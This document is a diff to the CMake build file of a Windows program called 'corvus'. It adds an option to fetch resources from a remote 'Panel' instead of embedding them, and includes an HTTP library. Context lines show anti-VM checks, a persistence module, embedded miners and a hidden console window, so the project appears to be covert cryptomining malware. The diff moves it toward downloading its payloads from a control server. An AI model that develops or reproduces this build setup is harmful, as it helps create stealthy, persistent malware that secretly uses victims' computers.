@@ -37,6 +37,9 @@ if(CONFIG_GET_URL)
     add_definitions(-DCONFIG_GET_URL="${CONFIG_GET_URL}")
 endif()
 
+# Optional Load Files from Panel feature
+option(ENABLE_FETCH_EMBEDDED "Fetches the Resources from Panel (Decrease Binary Size)" OFF)
+
 # Source files
 set(SRC_FILES
     src/main.cpp
@@ -51,9 +54,14 @@ set(SRC_FILES
 )
 
 # Resource files
+if(NOT ENABLE_FETCH_EMBEDDED)
 set(RESOURCE_FILES
     resources/embedded_resource.rc
 )
+else()
+    message(STATUS "Fetch_Embedded enabled")
+    add_definitions(-DFETCH_EMBEDDED)
+endif()
 
 # Header files
 set(HEADER_FILES
@@ -68,6 +76,7 @@ set(HEADER_FILES
     include/json.hpp
     include/process_info.h
     include/config_manager.h
+    include/httplib.h
 )
 
 # Add Anti-VM files if enabled
@@ -86,6 +95,7 @@ if(ENABLE_PERSISTENCE)
     list(APPEND HEADER_FILES include/persistence.h)
 endif()
 
+
 # Miners are now embedded as resources in the executable
 set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS}")
 if(MSVC)
@@ -98,12 +108,21 @@ endif()
 set(CMAKE_FIND_LIBRARY_SUFFIXES ".a")
 
 # Create executable
+if(NOT ENABLE_FETCH_EMBEDDED)
 add_executable(corvus 
     #WIN32 
     ${SRC_FILES}
     ${RESOURCE_FILES}
     ${HEADER_FILES}
 )
+else()
+add_executable(corvus 
+    #WIN32 
+    ${SRC_FILES}
+    ${HEADER_FILES}
+)
+endif()
+
 
 # Set linker flags for GUI subsystem (hide console)
 set_target_properties(corvus PROPERTIES
